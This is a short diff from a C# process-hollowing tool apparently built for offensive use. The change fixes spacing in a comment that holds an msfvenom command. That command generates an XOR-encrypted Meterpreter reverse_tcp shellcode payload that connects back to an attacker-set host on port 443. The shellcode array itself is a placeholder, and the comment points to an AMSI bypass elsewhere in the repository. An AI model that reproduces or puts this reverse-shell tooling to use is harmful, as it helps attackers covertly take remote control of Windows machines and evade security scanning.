@@ -227,7 +227,7 @@ namespace ProcHollow
             Console.WriteLine("[4] Entry Point is 0x{0}", entryPointAddr.ToString("X"));
 
             // this is a Process hollowing executable, a regular shellcode runner and amsi bypass in powershell can be found in the root of this repo
-            //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 - f csharp --encrypt xor --encrypt - key a
+            //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443  -f csharp --encrypt xor --encrypt-key a
             byte[] shellcode = new byte[510] {<Shellcode>};
 
 
